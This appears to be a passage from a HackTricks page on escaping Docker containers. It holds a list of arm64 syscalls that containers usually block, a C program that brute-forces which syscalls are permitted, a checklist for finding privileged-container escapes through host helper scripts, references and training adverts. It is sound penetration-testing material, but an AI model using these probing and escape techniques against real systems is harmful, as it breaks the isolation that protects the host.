{% tab title="arm64 syscalls" %}
```
0x029 -- pivot_root
0x059 -- acct
0x069 -- init_module
0x06a -- delete_module
0x074 -- syslog
0x09d -- setsid
0x0a1 -- sethostname
0x0a2 -- setdomainname
0x0aa -- settimeofday
0x0e0 -- swapon
0x0e1 -- swapoff
0x106 -- fanotify_init
0x109 -- open_by_handle_at
0x111 -- finit_module
0x118 -- bpf
```
{% endtab %}

{% tab title="syscall_bf.c" %}
````c
// From a conversation I had with @arget131
// Fir bfing syscalss in x64

#include <sys/syscall.h>
#include <unistd.h>
#include <stdio.h>
#include <errno.h>

int main()
{
for(int i = 0; i < 333; ++i)
{
if(i == SYS_rt_sigreturn) continue;
if(i == SYS_select) continue;
if(i == SYS_pause) continue;
if(i == SYS_exit_group) continue;
if(i == SYS_exit) continue;
if(i == SYS_clone) continue;
if(i == SYS_fork) continue;
if(i == SYS_vfork) continue;
if(i == SYS_pselect6) continue;
if(i == SYS_ppoll) continue;
if(i == SYS_seccomp) continue;
if(i == SYS_vhangup) continue;
if(i == SYS_reboot) continue;
if(i == SYS_shutdown) continue;
if(i == SYS_msgrcv) continue;
printf("Probando: 0x%03x . . . ", i); fflush(stdout);
if((syscall(i, NULL, NULL, NULL, NULL, NULL, NULL) < 0) && (errno == EPERM))
printf("Error\n");
else
printf("OK\n");
}
}
```

````
{% endtab %}
{% endtabs %}

### Container Breakout through Usermode helper Template

If you are in **userspace** (**no kernel exploit** involved) the way to find new escapes mainly involve the following actions (these templates usually require a container in privileged mode):

* Find the **path of the containers filesystem** inside the host
* You can do this via **mount**, or via **brute-force PIDs** as explained in the second release\_agent exploit
* Find some functionality where you can **indicate the path of a script to be executed by a host process (helper)** if something happens
* You should be able to **execute the trigger from inside the host**
* You need to know where the containers files are located inside the host to indicate a script you write inside the host
* Have **enough capabilities and disabled protections** to be able to abuse that functionality
* You might need to **mount things** o perform **special privileged actions** you cannot do in a default docker container

## References

* [https://twitter.com/\_fel1x/status/1151487053370187776?lang=en-GB](https://twitter.com/\_fel1x/status/1151487053370187776?lang=en-GB)
* [https://blog.trailofbits.com/2019/07/19/understanding-docker-container-escapes/](https://blog.trailofbits.com/2019/07/19/understanding-docker-container-escapes/)
* [https://ajxchapman.github.io/containers/2020/11/19/privileged-container-escape.html](https://ajxchapman.github.io/containers/2020/11/19/privileged-container-escape.html)
* [https://medium.com/swlh/kubernetes-attack-path-part-2-post-initial-access-1e27aabda36d](https://medium.com/swlh/kubernetes-attack-path-part-2-post-initial-access-1e27aabda36d)
* [https://0xn3va.gitbook.io/cheat-sheets/container/escaping/host-networking-driver](https://0xn3va.gitbook.io/cheat-sheets/container/escaping/host-networking-driver)
* [https://0xn3va.gitbook.io/cheat-sheets/container/escaping/exposed-docker-socket](https://0xn3va.gitbook.io/cheat-sheets/container/escaping/exposed-docker-socket)
* [https://bishopfox.com/blog/kubernetes-pod-privilege-escalation#Pod4](https://bishopfox.com/blog/kubernetes-pod-privilege-escalation#Pod4)

<figure><img src="../../../../.gitbook/assets/image (48).png" alt=""><figcaption></figcaption></figure>

Use [**Trickest**](https://trickest.com/?utm_source=hacktricks&utm_medium=text&utm_campaign=ppc&utm_term=trickest&utm_content=docker-breakout-privilege-escalation) to easily build and **automate workflows** powered by the world's **most advanced** community tools.\
Get Access Today:

{% embed url="https://trickest.com/?utm_source=hacktricks&utm_medium=banner&utm_campaign=ppc&utm_content=docker-breakout-privilege-escalation" %}

{% hint style="success" %}
Learn & practice AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
Learn & practice GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Support HackTricks</summary>

* Check the [**subscription plans**](https://github.com/sponsors/carlospolop)!
* **Join the** 💬 [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Share hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
{% endhint %}
